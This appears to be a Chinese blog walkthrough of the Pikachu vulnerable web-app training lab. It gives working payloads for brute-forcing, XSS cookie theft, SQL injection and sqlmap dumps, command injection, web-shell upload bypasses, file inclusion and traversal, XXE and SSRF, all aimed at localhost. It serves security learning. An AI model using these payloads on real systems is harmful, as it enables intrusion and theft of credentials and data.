---
title: Pikachu练习记录
published: 2023-08-10
description: ''
image: 'https://hexoimage.pages.dev/file/43665ba95443e49885078.jpg'
tags: [Pikachu, 靶场, 网络安全] 
category: '网络安全'
draft: false 
lang: ''
---

<meta name="referrer" content="no-referrer"/>

## Pikachu练习记录

## 0x01 Pikachu靶场

Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意。

靶场链接：[Pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)

## 0x02 暴力破解

### 基于表单的暴力破解

如题，直接放burp里暴力破解即可

### 验证码绕过（on server）

在intruder里同一个验证码可重复使用

### 验证码绕过（on client）

在intruder里同一个验证码可重复使用，也可以审查元素把相关的验证码代码删掉，不影响

### Token防爆破？

多次抓包后发现，每次抓取的数据包中都含有下次请求所需要的token

![token防爆破](https://s1.vika.cn/space/2023/08/12/93c1e629ff51411a8dd4ea533d963e9c)

可以用burp里Intruder进行爆破，爆破类型用Pitchfork，爆破变量为password和token

![token防爆破](https://s1.vika.cn/space/2023/08/12/6b3b71caf0f2436ebbb3ea5e7a314dec)

![token防爆破](https://s1.vika.cn/space/2023/08/12/200238fc90554a519f8351a42500e833)

对于token载荷相关设置，Payload type选择为 Recursive grep（递归搜索）

![token防爆破](https://s1.vika.cn/space/2023/08/12/9593577156c644adaebdb73e92b11b1c)
然后在设置中的Grep - Extract中添加过滤项，找到token的位置，进行添加，同时把token值复制一下

![token防爆破](https://s1.vika.cn/space/2023/08/12/685ec0ee19d54df6ac580fdfd7eb1906)

最后填写下一个token值开始爆破

![token防爆破](https://s1.vika.cn/space/2023/08/12/0b079f2c0fe541438b071614d3b0aa04)

![token防爆破](https://s1.vika.cn/space/2023/08/12/e1ca103f02c94e70b1ede69fca8a8193)

## 0x03 Cross-Site Scripting

### 反射型xss（get）

输入框被限制了最大输入长度，但是可以通过审查元素修改maxlength值来解除限制

![反弹型xss1](https://s1.vika.cn/space/2023/08/12/10c035bdcf644ccb94a0a7a37753a2a2)

```txt
输入框直接上脚本
<script>alert('hello')</script>
```

### 反射型xss（post）

```txt
登陆进去后输入框内输入以下内容
<script>alert(document.cookie)</script>
```

### 存储型xss

```txt
<script>alert(document.cookie)</script>
```

### DOM型xss

输入hello正常文本

![dom型xss1](https://s1.vika.cn/space/2023/08/12/9786a08c2f5c41ceacb971a40c3fe15c)

输入下方文本

```txt
#' onclick=alert('hello')>
```

![dom型xss2](https://s1.vika.cn/space/2023/08/12/c833289eb960479085de9bcb64f30698)

### DOM型xss-x

```txt
' onclick=alert('hello')>
```

输入信息同时也会显示在url输入框里。

![dom型xss-x1](https://s1.vika.cn/space/2023/08/12/3c48c1b0488e43e39851e5b69b5301f9)

### xss之盲打

```txt
留言板输入：
<script>alert(document.cookie)</script>
```

![xss之盲打1](https://s1.vika.cn/space/2023/08/12/d152522ab50d4633aa4104e1caa5f4fe)

提示/xssblind/admin_login.php，登陆后台发现脚本会立即执行

### xss之过滤

大小写绕过

```txt
<ScRipt>alert(1)</ScriPt>
```

### xss之htmlspecialchars

```txt
' onclick='alert(1)'

' onclick='javascript:alert(document.cookie)'
```

### xss之href输出

js伪协议绕过

```txt
javascript:alert(1)
```

### xss之js输出

输入信息通过审查元素可以看到输入内容在js标签内

![xss之js输出1](https://s1.vika.cn/space/2023/08/12/752caaecac864c0b9a9a89f9bae62685)

可以先把前面的\<script\>进行闭合，构造以下payload即可

```txt
</script><script>alert(1)</script>
```

## 0x04 CSRF

### CSRF(get)

### CSRF(post)

### CSRF(token)

## 0x05 Sql Inject

### 数字型注入

**1，手动注入**

发现是个选项，无法输入东西 ，直接拦截数据包，在burp里进行修改

![数字型注入1](https://s1.vika.cn/space/2023/08/12/61878eb5117346278df8e6d21d484797)

```txt
id=1
#正常回显

id=1'
#提示报错

id=1 and 1=1
#正常回显

id=1 and 1=2
#报错，基本判断为mysql数据库的数字型注入点


id=1 or 1=1
#直接爆破出全部数据
```

**2，无脑sqlmap**

```txt
sqlmap.py -u http://127.0.0.1/vul/sqli/sqli_id.php --data "id=1" --batch -D pikachu -T member --dump
```

![数字型注入2](https://s1.vika.cn/space/2023/08/12/7a4fcbf829824989ab92496fc3c086ca)

### 字符型注入

```txt
123
#正常

123'
#发现报错

123''
#又是正常了，基本上判定为字符型注入

123' or 1=1 #
#爆出所有用户



//附

123' union select database(),2 #
#查询数据库名称

123' union select table_schema,table_name from information_schema.tables where table_schema="pikachu" #
#查询表，发现有个users项

123' union select table_name,column_name from information_schema.columns where table_name="users" #
#查询uesrs表中的内容，发现存在username和password项

123' union select username,password from users #
#查出信息，但是密码是经过md5加密的，解密一下就行
```

**sqlmap**

```txt
sqlmap.py -u "http://127.0.0.1/vul/sqli/sqli_str.php?name=1&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T member --batch --dump
```

### 搜索型注入

由于没有过滤“%”，“%”可以进行匹配任意字符，与linux中的”*“类似

**sqlmap**

```txt
sqlmap.py -u "http://127.0.0.1/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" --batch -D pikachu -T member --dump
```

### xx型注入

用123‘测试发现报错中含有一个反括号，

![xx型注入1](https://s1.vika.cn/space/2023/08/12/0b40919a80ae498d9815e4457a5965b4)

那就构造以下payload：

```txt
123') or 1=1 #
```

**sqlmap**

```txt
python sqlmap.py -u "http://127.0.0.1/vul/sqli/sqli_x.php?name=1&submit=%E6%9F%A5%E8%AF%A2" --batch -D pikachu -T member --dump
```

### “insert/update”注入

注册一下账户，然后brup抓包，随便选一个变量，修改如下

![报错注入1](https://s1.vika.cn/space/2023/08/12/fe555fea57e745c9b9428ea38bb4a2dd)

```txt
' and extractvalue(1,concat('~',(select database()))) and '1'='1
' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1


# 报错注入两个典型的函数
extractvalue()		是mysql对xml文档数据进行查询和修改的xpath函数
updatexml()			是mysql对xml文档数据进行查询的xpath函数
```

### “delete”注入

操作同上，在点击删除留言时进行抓包，发现有一个id参数可以进行注入，不过发现注入的参数中不能出现空格，否则空格后面不会进行处理

可以用“+”代替空格

```txt
+and+updatexml(1,concat(0x7e,database(),0x7e),1)
```

![报错注入2](https://s1.vika.cn/space/2023/08/12/0af26ca25cc440cd87e1683bc22e3942)

### “http header”注入

![http_header注入](https://s1.vika.cn/space/2023/08/12/4f4d58643a944fefa047f5119908366c)

用提示给的用户登陆以下发现显示以上信息

直接抓包，然后修改User-Agent或者Accept，

修改如下：

```txt
' and extractvalue(1,concat(0x7e,(database()))) and '1'='1
或
' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
```

经测试，cookie中的uname和pw变量也能进行注入

### 盲注（base on boolean）

当输入kobe时显示uid和email

当输入其他的值后显示输入的username不存在

![boolean盲注1](https://s1.vika.cn/space/2023/08/12/41d6aa8e61624862b3dc0e6f830adf3e)

经测试是用 **‘** 进行闭合的

```txt
kobe'
# 未查到username信息

kobe'and '1'='1
#可以查到，判定用'闭合

kobe'and length(database())=n#
# "n"为一个数字，此处为了判定数据库字符的长度，经测试，当n=7时，正常显示，即可判定数据库名字长度为7
```

burp抓包进行爆破数据库名字

```txt
kobe' and substr(database(),1,1)='a'#
```

![boolean盲注2](https://s1.vika.cn/space/2023/08/12/98bc46e26cd34842a309e03383a136ba)

第一个参数修改

![boolean盲注3](https://s1.vika.cn/space/2023/08/12/e4c7a656d5df4108aefea632dbd20f7a)

第二个参数修改，爆破字符为a-z ，顺带着添加一个”_”

![boolean盲注4](https://s1.vika.cn/space/2023/08/12/77a6c71a8e894d339f3afd1ad959468f)

**sqlmap**

```txt
sqlmap.py -u "http://127.0.0.1/vul/sqli/sqli_blind_b.php?name=123&submit=%E6%9F%A5%E8%AF%A2" --batch
```

然后稍微排下序即可爆出数据库名字

![boolean盲注5](https://s1.vika.cn/space/2023/08/12/d7935e52aaaf4a2c8b63c0db5a262dfc)

### 盲注（base on time）

增加一个sleep(n)函数，加个判断，用回显时间的长短来判断，剩下的操作和上一样

**sqlmap**

```txt
sqlmap.py -u "http://127.0.0.1/vul/sqli/sqli_blind_t.php?name=123&submit=%E6%9F%A5%E8%AF%A2" --batch
```

### 宽字节注入

引用大佬的链接[https://blog.csdn.net/aa2528877987/article/details/118569895 ](https://blog.csdn.net/aa2528877987/article/details/118569895)

```txt
宽字节注入原理：

　　GBK 占用两字节

　　ASCII占用一字节

　　PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集。

　　输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。

　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\'” ，“\”既URL里的“%5C”，那么也就是说，“%DF'”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”

例如：http://www.xxx.com/login.php?user=%df’ or 1=1 limit 1,1%23&pass=

其对应的sql就是：

select * fromcms_user where username = ‘運’ or 1=1 limit 1,1#’ and password=”
```

在’前面加个%df也就可以实现逃逸转义，然后burp抓包，剩下操作同上

## 0x06 RCE

### exec”ping”

```txt
127.0.0.1&&dir
#执行完ping指令后同时执行dir指令
```

### exec”eval”

```txt
直接输入 phpinfo();
```

经过查看源码发现代码如下

![rce1](https://s1.vika.cn/space/2023/08/12/926ff3d7ff244063a72151fdfa320164)

于是尝试用蚁剑进行连接，最后发现修改如下可以成功连接

![rce2](https://s1.vika.cn/space/2023/08/12/7c167c375da14a80b7fabd5de25c8c3c)

![rce3](https://s1.vika.cn/space/2023/08/12/bfbd21abb81c490c90604445e925dbb5)

![rce4](https://s1.vika.cn/space/2023/08/12/b6aa7e06167d42bdad304479a1dee4d2)

## 0x07 File Inclusion

### file inclusion(local)

```txt
..\..\..\Users\sfd\Desktop\demo.txt
#直接访问电脑桌面的文件
```

![file_inclusion](https://s1.vika.cn/space/2023/08/12/6913ded72a084cd498cbccb2d9326e5d)

### file inclusion(remote)

同标题，还是相同的位置，可以通过输入链接进行访问其他东西

## 0x08 Unsafe file download

### Unsafe file download

当鼠标悬浮在要下载的文件上时，发现左下角有详细链接

那么我们可以修改这个链接指向的filename来进行下载任意文件

![不安全的文件下载1](https://s1.vika.cn/space/2023/08/12/fbb7680a5a144f76bd1411647a0d5311)

要下载本地文件用法和[File Inclusion(loacl)](#File Inclusion(local))一样，直接在filename=后面添加想要下载文件的相对位置

## 0x09 [unsafe upfileupload]

### client check

先上传一张图片，然后burp抓包，修改后缀后放包即可



最后用蚁剑连接即可。

### MIME type

直接上传php木马，同样抓包，然后修改Content-Type 为 image/png 即可

![MIME_type1](https://s1.vika.cn/space/2023/08/12/0df49d200af8493ba3a38fad75d4756f)

### getimagesize()

添加了对文件进行判断有没有图片特征的函数，直接用cmd命令合成一个图片码即可绕过

```txt
copy /b a.png + a.php b.png
```

![getimagesize1](https://s1.vika.cn/space/2023/08/12/735f4d62e1bf4d738bab5a37f5b2b516)

## 0x10 over permission

### 水平越权

首先以lucy的身份进行登录，然后可以看到lucy的信息

```txt
http://127.0.0.1/vul/overpermission/op1/op1_mem.php?username=lucy&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
```

这时我们直接修改url里的username，将其指定为kobe,就可以直接查看kobe的信息

```txt
http://127.0.0.1/vul/overpermission/op1/op1_mem.php?username=kobe&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
```

### 垂直越权

pikachu用户只有查看权限，而admin用户有所有权限

首先登陆admin并添加用户，然后可以获得一个url地址

```txt
http://127.0.0.1/vul/overpermission/op2/op2_admin_edit.php
```

然后我们用pikachu用户登陆，然后直接输入上面的地址，发现可以进入添加用户界面，并且可以正常添加用户，回到admin用户后发现可以看到当前创建的用户

## 0x11 ../../(目录遍历)

### 目录遍历

```txt
../../../../Users/sfd/Desktop/demo.txt
#访问桌面的一个demo.txt 文件
```

## 0x12 敏感信息泄露

### icanyourABC

F12进行元素审查时发现一个测试用户可以使用

![敏感信息泄露1](https://s1.vika.cn/space/2023/08/12/f71e82366b5d4a41bbcc9987ace4a02f)

## 0x13 php反序列化

### php反序列化漏洞

php涉及到序列化的函数有两个，分别是serialize()`和`unserialize()

序列化简单来说就是将一个**对象**转化成可以传输的**字符串**，反序列化就是相反的操作

```txt
#举个例子
class S{
        public $test="pikachu";
    }
    
    $s=new S(); //创建一个对象
    serialize($s); //把这个对象进行序列化
  
  
    序列化后得到的结果是这个样子的 O:1:"S":1:{s:4:"test";s:7:"pikachu";}
  	    O:代表object
        1:代表对象名字长度为一个字符
        S:对象的名称
        1:代表对象里面有一个变量
        s:数据类型
        4:变量名称的长度
        test:变量名称
        s:数据类型
        7:变量值的长度
        pikachu:变量值
```

反序列化

```txt
$u=unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
    echo $u->test; //得到的结果为pikachu
```

序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题

```txt
常见的几个魔法函数:
	__construct()当一个对象创建时被调用

	__destruct()当一个对象销毁时被调用

	__toString()当一个对象被当作一个字符串使用

	__sleep() 在对象在被序列化之前运行

	__wakeup将在序列化之后立即被调用

漏洞举例:

	class S{
		var $test = "pikachu";
		function __destruct(){
			echo $this->test;
		}
	}
	$s = $_GET['test'];
	@$unser = unserialize($a);


	payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

## 0x14 XXE

### XXE漏洞

前端将`$_POST['xml']`传递给变量`$xml,` 由于后台没有对此变量进行安全判断就直接使用`simplexml_load_string`函数进行xml解析, 从而导致xxe漏洞

```txt
<!-- 打印hello world -->
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE note [
    <!ENTITY test "hello world">
]>
<name>&test;</name>


<!-- 读取D盘根目录下的a.txt -->
<?xml version="1.0"?> 
<!DOCTYPE ANY[  
	<!ENTITY f SYSTEM "file:///D:/a.txt"> 
]> 
<x>&f;</x>
```

## 0x15 URL重定向

### 不安全的url跳转

修改url=后面的参数

```txt
http://127.0.0.1/vul/urlredirect/urlredirect.php?url=https://baidu.com
```

## 0x16 SSRF

- curl 支持更多协议，有http、https、ftp、gopher、telnet、dict、file、ldap；模拟 Cookie 登录，爬取网页；FTP 上传下载。
- fopen / file_get_contents 只能使用 GET 方式获取数据

SSRF漏洞常用协议：

### SSRF(curl)

通过url参数直接访问内部资源，或者跳转到其他服务器页面

```txt
HTTP(s):最常用到的一种协议，可以用来验证是否存在SSRF漏洞，探测端口以及服务。
file：本地文件传输协议，可以用来读取任意系统文件
dict:字典服务器协议，dict是基于查询相应的TCP协议，服务器监听端口2628。在SSRF漏洞中可用于探测端口以及攻击内网应用
ghoper:互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。可用于攻击内网应用，可用于反弹shell。
```

例：

```txt
//访问内网链接资源
http://127.0.0.1/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/vul/ssrf/ssrf_info/info2.php


//读取D盘根目录a.txt
http://127.0.0.1/vul/ssrf/ssrf_curl.php?url=file:///D:/a.txt


//用dict扫描内网主机开放的端口，端口存在时显示不同的信息
dict://192.168.1.66:80
```

### SSRF(file_get_content)

利用file_get_content(“path”)利用传递的参数，通过file参数访问内部资源，或者跳转到其他服务器页面

```txt
//直接读取内部文件
http://127.0.0.1/vul/ssrf/ssrf_fgc.php?file=D:/a.txt
```

php伪协议读取文件

```txt
php://filter/read=convert.base64-encode/resource=D:/a.txt
```

![SSRF1](https://s1.vika.cn/space/2023/08/12/fac52ef62e274aa49b4bc8e7eb36df6f)

- **Title:** Pikachu练习记录